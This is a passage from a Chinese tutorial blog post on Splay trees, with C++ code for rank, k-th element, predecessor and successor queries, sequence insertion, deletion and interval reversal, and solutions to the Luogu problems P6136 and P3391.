class="built_in">succ</span>();</span><br><span class="line"></span><br><span class="line">    pred-&gt;<span class="built_in">splay</span>();</span><br><span class="line">    succ-&gt;<span class="built_in">splay</span>(pred);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> succ-&gt;ch[<span class="number">0</span>];</span><br><span class="line">    succ-&gt;ch[<span class="number">0</span>] = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    succ-&gt;<span class="built_in">maintain</span>();</span><br><span class="line">    pred-&gt;<span class="built_in">maintain</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="查询值排名-查询第-k-大">查询值排名 / 查询第 <span
class="math inline">\(k\)</span> 大</h3>
<p>若有值，则查询值排名只需将该点 Splay
到根，返回左子树大小。若无值，则可先插入该点，查询后删除。</p>
<p>查询第 <span class="math inline">\(k\)</span>
大则使用上述方法遍历即可。</p>
<p>查完后将查询到的值 Splay 至根。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">rank</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">    Node *v = <span class="built_in">find</span>(x);</span><br><span class="line">    <span class="keyword">if</span> (v) &#123;</span><br><span class="line">        v-&gt;<span class="built_in">splay</span>();</span><br><span class="line">        <span class="keyword">return</span> v-&gt;<span class="built_in">lSize</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        v = <span class="built_in">insert</span>(x);</span><br><span class="line">        <span class="type">int</span> ans = v-&gt;<span class="built_in">lSize</span>();</span><br><span class="line">        <span class="built_in">erase</span>(v);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Node *<span class="title">select</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    k++;</span><br><span class="line">    Node *v = root;</span><br><span class="line">    <span class="keyword">while</span> (!(v-&gt;<span class="built_in">lSize</span>() + <span class="number">1</span> &lt;= k &amp;&amp; v-&gt;<span class="built_in">lSize</span>() + v-&gt;count &gt;= k)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k &lt; v-&gt;<span class="built_in">lSize</span>() + <span class="number">1</span>) v = v-&gt;ch[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            k -= v-&gt;<span class="built_in">lSize</span>() + v-&gt;count;</span><br><span class="line">            v = v-&gt;ch[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v-&gt;<span class="built_in">splay</span>();</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="查询值的前驱-后继">查询值的前驱 / 后继</h3>
<p>同查询排名，若有值则直接按上述方法模拟，若无值则插入，查询后删除即可。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> T &amp;<span class="title">pred</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">    Node *v = <span class="built_in">find</span>(x);</span><br><span class="line">    <span class="keyword">if</span> (v) <span class="keyword">return</span> v-&gt;<span class="built_in">pred</span>()-&gt;x;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        v = <span class="built_in">insert</span>(x);</span><br><span class="line">        <span class="type">const</span> T &amp;ans = v-&gt;<span class="built_in">pred</span>()-&gt;x;</span><br><span class="line">        <span class="built_in">erase</span>(v);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">const</span> T &amp;<span class="title">succ</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">    Node *v = <span class="built_in">find</span>(x);</span><br><span class="line">    <span class="keyword">if</span> (v) <span class="keyword">return</span> v-&gt;<span class="built_in">succ</span>()-&gt;x;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        v = <span class="built_in">insert</span>(x);</span><br><span class="line">        <span class="type">const</span> T &amp;ans = v-&gt;<span class="built_in">succ</span>()-&gt;x;</span><br><span class="line">        <span class="built_in">erase</span>(v);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="二叉搜索树例题">二叉搜索树例题</h1>
<p><a href="https://www.luogu.com.cn/problem/P6136">洛谷 P6136
普通平衡树（数据加强版）</a>（数据比 <a
href="https://www.luogu.com.cn/problem/P3369">洛谷 P3369 普通平衡树</a>
强不少）</p>
<p>平衡树板子，直接敲上去就行了。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;climits&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, T INF&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Splay</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        Node *ch[<span class="number">2</span>], *fa, **root;</span><br><span class="line">        T x;</span><br><span class="line">        <span class="type">int</span> size, count;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Node</span>(Node *fa, Node **root, T x) : <span class="built_in">fa</span>(fa), <span class="built_in">root</span>(root), <span class="built_in">x</span>(x), <span class="built_in">count</span>(<span class="number">1</span>) &#123;</span><br><span class="line">            ch[<span class="number">0</span>] = ch[<span class="number">1</span>] = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ~<span class="built_in">Node</span>() &#123;</span><br><span class="line">            <span class="keyword">if</span> (ch[<span class="number">0</span>]) <span class="keyword">delete</span> ch[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (ch[<span class="number">1</span>]) <span class="keyword">delete</span> ch[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">maintain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            size = (ch[<span class="number">0</span>] ? ch[<span class="number">0</span>]-&gt;size : <span class="number">0</span>) + (ch[<span class="number">1</span>] ? ch[<span class="number">1</span>]-&gt;size : <span class="number">0</span>) + count;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">relation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span> == fa-&gt;ch[<span class="number">0</span>] ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Node *o = fa;</span><br><span class="line">            <span class="type">int</span> r = <span class="built_in">relation</span>();</span><br><span class="line"></span><br><span class="line">            fa = o-&gt;fa;</span><br><span class="line">            <span class="keyword">if</span> (fa) fa-&gt;ch[o-&gt;<span class="built_in">relation</span>()] = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">            o-&gt;ch[r] = ch[r ^ <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (ch[r ^ <span class="number">1</span>]) ch[r ^ <span class="number">1</span>]-&gt;fa = o;</span><br><span class="line"></span><br><span class="line">            ch[r ^ <span class="number">1</span>] = o;</span><br><span class="line">            o-&gt;fa = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!fa) *root = <span class="keyword">this</span>;</span><br><span class="line">            o-&gt;<span class="built_in">maintain</span>();</span><br><span class="line">            <span class="built_in">maintain</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">splay</span><span class="params">(Node *targetFa = <span class="literal">nullptr</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (fa != targetFa) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fa-&gt;fa == targetFa) <span class="built_in">rotate</span>();</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (fa-&gt;<span class="built_in">relation</span>() == <span class="built_in">relation</span>()) &#123;</span><br><span class="line">                    fa-&gt;<span class="built_in">rotate</span>();</span><br><span class="line">                    <span class="built_in">rotate</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">rotate</span>();</span><br><span class="line">                    <span class="built_in">rotate</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function">Node *<span class="title">pred</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">splay</span>();</span><br><span class="line">            Node *v = ch[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">while</span> (v-&gt;ch[<span class="number">1</span>]) v = v-&gt;ch[<span class="number">1</span>];</span><br><span class="line">            v-&gt;<span class="built_in">splay</span>();</span><br><span class="line">            <span class="keyword">return</span> v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function">Node *<span class="title">succ</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">splay</span>();</span><br><span class="line">            Node *v = ch[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">while</span> (v-&gt;ch[<span class="number">0</span>]) v = v-&gt;ch[<span class="number">0</span>];</span><br><span class="line">            v-&gt;<span class="built_in">splay</span>();</span><br><span class="line">            <span class="keyword">return</span> v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">lSize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ch[<span class="number">0</span>] ? ch[<span class="number">0</span>]-&gt;size : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; *root;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Splay</span>() : <span class="built_in">root</span>(<span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="built_in">insert</span>(INF);</span><br><span class="line">        <span class="built_in">insert</span>(-INF);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">Splay</span>() &#123;</span><br><span class="line">        <span class="keyword">delete</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">Node *<span class="title">find</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">        Node *v = root;</span><br><span class="line">        <span class="keyword">while</span> (v &amp;&amp; x != v-&gt;x) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x &lt; v-&gt;x) v = v-&gt;ch[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">else</span> v = v-&gt;ch[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!v) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        v-&gt;<span class="built_in">splay</span>();</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">Node *<span class="title">insert</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">        Node *v = <span class="built_in">find</span>(x);</span><br><span class="line">        <span class="keyword">if</span> (v) &#123;</span><br><span class="line">            v-&gt;count++;</span><br><span class="line">            v-&gt;<span class="built_in">maintain</span>();</span><br><span class="line">            <span class="keyword">return</span> v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Node **target = &amp;root, *fa = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (*target) &#123;</span><br><span class="line">            fa = *target;</span><br><span class="line">            fa-&gt;size++;</span><br><span class="line">            <span class="keyword">if</span> (x &lt; fa-&gt;x) target = &amp;fa-&gt;ch[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">else</span> target = &amp;fa-&gt;ch[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *target = <span class="keyword">new</span> <span class="built_in">Node</span>(fa, &amp;root, x);</span><br><span class="line">        (*target)-&gt;<span class="built_in">splay</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">erase</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">erase</span>(<span class="built_in">find</span>(x));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">erase</span><span class="params">(Node *v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (v-&gt;count != <span class="number">1</span>) &#123;</span><br><span class="line">            v-&gt;<span class="built_in">splay</span>();</span><br><span class="line">            v-&gt;count--;</span><br><span class="line">            v-&gt;<span class="built_in">maintain</span>();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Node *pred = v-&gt;<span class="built_in">pred</span>();</span><br><span class="line">        Node *succ = v-&gt;<span class="built_in">succ</span>();</span><br><span class="line"></span><br><span class="line">        pred-&gt;<span class="built_in">splay</span>();</span><br><span class="line">        succ-&gt;<span class="built_in">splay</span>(pred);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">delete</span> succ-&gt;ch[<span class="number">0</span>];</span><br><span class="line">        succ-&gt;ch[<span class="number">0</span>] = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        succ-&gt;<span class="built_in">maintain</span>();</span><br><span class="line">        pred-&gt;<span class="built_in">maintain</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rank</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">        Node *v = <span class="built_in">find</span>(x);</span><br><span class="line">        <span class="keyword">if</span> (v) &#123;</span><br><span class="line">            v-&gt;<span class="built_in">splay</span>();</span><br><span class="line">            <span class="keyword">return</span> v-&gt;<span class="built_in">lSize</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            v = <span class="built_in">insert</span>(x);</span><br><span class="line">            <span class="type">int</span> ans = v-&gt;<span class="built_in">lSize</span>();</span><br><span class="line">            <span class="built_in">erase</span>(v);</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">Node *<span class="title">select</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        k++;</span><br><span class="line">        Node *v = root;</span><br><span class="line">        <span class="keyword">while</span> (!(v-&gt;<span class="built_in">lSize</span>() + <span class="number">1</span> &lt;= k &amp;&amp; v-&gt;<span class="built_in">lSize</span>() + v-&gt;count &gt;= k)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k &lt; v-&gt;<span class="built_in">lSize</span>() + <span class="number">1</span>) v = v-&gt;ch[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                k -= v-&gt;<span class="built_in">lSize</span>() + v-&gt;count;</span><br><span class="line">                v = v-&gt;ch[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v-&gt;<span class="built_in">splay</span>();</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">const</span> T &amp;<span class="title">pred</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">        Node *v = <span class="built_in">find</span>(x);</span><br><span class="line">        <span class="keyword">if</span> (v) <span class="keyword">return</span> v-&gt;<span class="built_in">pred</span>()-&gt;x;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            v = <span class="built_in">insert</span>(x);</span><br><span class="line">            <span class="type">const</span> T &amp;ans = v-&gt;<span class="built_in">pred</span>()-&gt;x;</span><br><span class="line">            <span class="built_in">erase</span>(v);</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">const</span> T &amp;<span class="title">succ</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">        Node *v = <span class="built_in">find</span>(x);</span><br><span class="line">        <span class="keyword">if</span> (v) <span class="keyword">return</span> v-&gt;<span class="built_in">succ</span>()-&gt;x;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            v = <span class="built_in">insert</span>(x);</span><br><span class="line">            <span class="type">const</span> T &amp;ans = v-&gt;<span class="built_in">succ</span>()-&gt;x;</span><br><span class="line">            <span class="built_in">erase</span>(v);</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">    Splay&lt;<span class="type">int</span>, INT_MAX&gt; splay;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">        splay.<span class="built_in">insert</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> last = <span class="number">0</span>, ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        <span class="type">int</span> op, x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;op, &amp;x);</span><br><span class="line">        x ^= last;</span><br><span class="line">        <span class="keyword">if</span> (op == <span class="number">1</span>) splay.<span class="built_in">insert</span>(x);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">2</span>) splay.<span class="built_in">erase</span>(x);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">3</span>) last = splay.<span class="built_in">rank</span>(x);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">4</span>) last = splay.<span class="built_in">select</span>(x)-&gt;x;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">5</span>) last = splay.<span class="built_in">pred</span>(x);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">6</span>) last = splay.<span class="built_in">succ</span>(x);</span><br><span class="line">        <span class="keyword">if</span> (op &gt;= <span class="number">3</span> &amp;&amp; op &lt;= <span class="number">6</span>) ans ^= last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="序列操作">序列操作</h1>
<p>由于 Splay 的形态特殊，我们可以用它来解决序列问题。这时 Splay
的中序遍历即为序列的各元素顺序。所以说 <strong>Splay
不一定是有序的，它的中序遍历是可自定义的，可根据情况调整用途</strong>。</p>
<h2 id="序列插入">序列插入</h2>
<p>假设我们需要将序列 <span class="math inline">\(a\)</span> 插入到
<span class="math inline">\(x\)</span> 与 <span
class="math inline">\(y\)</span> 之间，只需要做下列 <span
class="math inline">\(3\)</span> 步：</p>
<ul>
<li>将 <span class="math inline">\(x\)</span> Splay 操作至根；</li>
<li>将 <span class="math inline">\(y\)</span> Splay 操作至 <span
class="math inline">\(x\)</span> 的右儿子；</li>
<li>由于 <span class="math inline">\(y\)</span> 为 <span
class="math inline">\(x\)</span> 的后继，故 <span
class="math inline">\(y\)</span> 的左子树必为空。此时只需将 <span
class="math inline">\(a\)</span> 插入 <span
class="math inline">\(y\)</span> 的左子树即可。</li>
</ul>
<h2 id="序列删除">序列删除</h2>
<p>与序列插入相似，假设我们需要需将 <span
class="math inline">\(x\)</span> 与 <span
class="math inline">\(y\)</span> 之间的序列 <span
class="math inline">\(a\)</span> 删除，依然只需 <span
class="math inline">\(3\)</span> 步：</p>
<ul>
<li>将 <span class="math inline">\(x\)</span> Splay 操作至根；</li>
<li>将 <span class="math inline">\(y\)</span> Splay 操作至 <span
class="math inline">\(x\)</span> 的右儿子；</li>
<li><span class="math inline">\(y\)</span> 的左子树即为 <span
class="math inline">\(x\)</span>、<span class="math inline">\(y\)</span>
之间的序列，即序列 <span
class="math inline">\(a\)</span>。于是我们只需删除 <span
class="math inline">\(y\)</span> 的左子树即可。</li>
</ul>
<h2 id="区间翻转">区间翻转</h2>
<p>这里可能区间翻转多次，所以可以像线段树一样作懒标记。然后将左右子树交换即可。最终传到叶子节点的时候由于每个都交换，即可达成翻转区间。</p>
<p>遍历到区间的时候就把懒标记下传，然后交换左右子树即可。</p>
<h1 id="序列例题">序列例题</h1>
<p><a href="https://www.luogu.com.cn/problem/P3391">洛谷 P3391
文艺平衡树</a></p>
<p>区间翻转板子，敲就完事了。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Splay</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        Node *ch[<span class="number">2</span>], *fa, **root;</span><br><span class="line">        T x;</span><br><span class="line">        <span class="type">int</span> size;</span><br><span class="line">        <span class="type">bool</span> rev, bound;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Node</span>(Node *fa, Node **root, T x, <span class="type">bool</span> bound = <span class="literal">false</span>) : <span class="built_in">fa</span>(fa), <span class="built_in">root</span>(root), <span class="built_in">x</span>(x), <span class="built_in">size</span>(<span class="number">1</span>), <span class="built_in">rev</span>(<span class="literal">false</span>), <span class="built_in">bound</span>(bound) &#123;</span><br><span class="line">            ch[<span class="number">0</span>] = ch[<span class="number">1</span>] = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">maintain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            size = (ch[<span class="number">0</span>] ? ch[<span class="number">0</span>]-&gt;size : <span class="number">0</span>) + (ch[<span class="number">1</span>] ? ch[<span class="number">1</span>]-&gt;size : <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">pushDown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (rev) &#123;</span><br><span class="line">                std::<span class="built_in">swap</span>(ch[<span class="number">0</span>], ch[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span> (ch[<span class="number">0</span>]) ch[<span class="number">0</span>]-&gt;rev ^= <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">if</span> (ch[<span class="number">1</span>]) ch[<span class="number">1</span>]-&gt;rev ^= <span class="literal">true</span>;</span><br><span class="line">                rev = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">relation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span> == fa-&gt;ch[<span class="number">0</span>] ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            fa-&gt;<span class="built_in">pushDown</span>();</span><br><span class="line"></span><br><span class="line">            Node *o = fa;</span><br><span class="line">            <span class="type">int</span> r = <span class="built_in">relation</span>();</span><br><span class="line"></span><br><span class="line">            fa = o-&gt;fa;</span><br><span class="line">            <span class="keyword">if</span> (fa) fa-&gt;ch[o-&gt;<span class="built_in">relation</span>()] = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">            o-&gt;ch[r] = ch[r ^ <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (ch[r ^ <span class="number">1</span>]) ch[r ^ <span class="number">1</span>]-&gt;fa = o;</span><br><span class="line"></span><br><span class="line">            ch[r ^ <span class="number">1</span>] = o;</span><br><span class="line">            o-&gt;fa = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!fa) *root = <span class="keyword">this</span>;</span><br><span class="line">            o-&gt;<span class="built_in">maintain</span>();</span><br><span class="line">            <span class="built_in">maintain</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">splay</span><span class="params">(Node *targetFa = <span class="literal">nullptr</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (fa != targetFa) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fa-&gt;fa) fa-&gt;fa-&gt;<span class="built_in">pushDown</span>();</span><br><span class="line">                fa-&gt;<span class="built_in">pushDown</span>();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (fa-&gt;fa == targetFa) <span class="built_in">rotate</span>();</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (fa-&gt;<span class="built_in">relation</span>() == <span class="built_in">relation</span>()) &#123;</span><br><span class="line">                    fa-&gt;<span class="built_in">rotate</span>();</span><br><span class="line">                    <span class="built_in">rotate</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">rotate</span>();</span><br><span class="line">                    <span class="built_in">rotate</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">lSize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">pushDown</span>();</span><br><span class="line">            <span class="keyword">return</span> ch[<span class="number">0</span>] ? ch[<span class="number">0</span>]-&gt;size : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; *root;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Splay</span>() : <span class="built_in">root</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">Node *<span class="title">build</span><span class="params">(<span class="type">int</span> *l, <span class="type">int</span> *r, Node *fa)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; r) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> *mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">        Node *v = <span class="keyword">new</span> <span class="built_in">Node</span>(fa, &amp;root, *mid);</span><br><span class="line">        v-&gt;ch[<span class="number">0</span>] = <span class="built_in">build</span>(l, mid - <span class="number">1</span>, v);</span><br><span class="line">        v-&gt;ch[<span class="number">1</span>] = <span class="built_in">build</span>(mid + <span class="number">1</span>, r, v);</span><br><span class="line"></span><br><span class="line">        v-&gt;<span class="built_in">maintain</span>();</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        root = <span class="keyword">new</span> <span class="built_in">Node</span>(<span class="literal">nullptr</span>, &amp;root, <span class="number">-1</span>, <span class="literal">true</span>);</span><br><span class="line">        root-&gt;ch[<span class="number">1</span>] = <span class="keyword">new</span> <span class="built_in">Node</span>(root, &amp;root, <span class="number">-1</span>, <span class="literal">true</span>);</span><br><span class="line">        root-&gt;<span class="built_in">maintain</span>();</span><br><span class="line"></span><br><span class="line">        root-&gt;ch[<span class="number">1</span>]-&gt;ch[<span class="number">0</span>] = <span class="built_in">build</span>(a + <span class="number">1</span>, a + n, root-&gt;ch[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        root-&gt;ch[<span class="number">1</span>]-&gt;<span class="built_in">maintain</span>();</span><br><span class="line">        root-&gt;<span class="built_in">maintain</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">Node *<span class="title">select</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        Node *v = root;</span><br><span class="line">        <span class="keyword">while</span> (k != v-&gt;<span class="built_in">lSize</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k &lt; v-&gt;<span class="built_in">lSize</span>()) v = v-&gt;ch[<span 